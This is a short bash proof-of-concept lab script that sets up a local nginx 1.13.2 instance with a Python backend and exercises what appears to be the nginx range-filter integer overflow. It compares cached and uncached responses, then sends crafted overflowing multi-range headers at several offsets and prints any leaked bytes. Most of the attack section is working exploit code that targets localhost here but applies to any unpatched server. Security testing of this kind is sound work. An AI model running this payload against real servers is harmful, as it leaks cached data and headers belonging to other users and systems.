#!/usr/bin/env bash
set -e
LAB="$HOME/nginx-poc-lab"
POCLAB="/mnt/d/download/PoClab/PoCLab"
pkill -f nginx-1.13.2 2>/dev/null || true
pkill -f backend-7529.py 2>/dev/null || true
sleep 1
rm -rf "$LAB/cache"/*
python3 "$LAB/backend-7529.py" &
sleep 1
echo "=== backend direct ==="
curl -sI http://127.0.0.1:18081/ | grep -E "HTTP|Content"
curl -sI -H "Range: bytes=0-10" http://127.0.0.1:18081/ | grep -E "HTTP|Content"
echo "=== nginx uncached (first request) ==="
"$LAB/nginx-1.13.2/sbin/nginx" -c "$LAB/conf/7529.conf"
curl -sI http://127.0.0.1:17529/ | grep -E "HTTP|Cache|Content"
curl -sI -H "Range: bytes=0-10" http://127.0.0.1:17529/ | grep -E "HTTP|Cache|Content"
echo "=== nginx cached (second request) ==="
curl -s http://127.0.0.1:17529/ >/dev/null
curl -sI http://127.0.0.1:17529/ | grep -E "HTTP|Cache|Content"
curl -sI -H "Range: bytes=0-10" http://127.0.0.1:17529/ | grep -E "HTTP|Cache|Content"
echo "=== body compare range vs full ==="
curl -s http://127.0.0.1:17529/ | wc -c
curl -s -H "Range: bytes=0-10" http://127.0.0.1:17529/ | wc -c
echo "=== malicious range ==="
python3 <<PY
import requests
url="http://127.0.0.1:17529/"
base=requests.get(url)
print("base status", base.status_code, "CL header", base.headers.get("Content-Length"), "body", len(base.content))
for offset in [605,623,624]:
    n=len(base.content)+offset
    hdr={"Range":"bytes=-%d,-%d"%(n, 0x8000000000000000-n)}
    r=requests.get(url, headers=hdr)
    print("offset", offset, "range", hdr["Range"][:50], "status", r.status_code, "len", len(r.content))
    if r.content!=base.content:
        print("  DIFF", repr(r.content[:120]))
PY
echo "=== error log tail ==="
tail -5 "$LAB/7529-error.log" 2>/dev/null || true
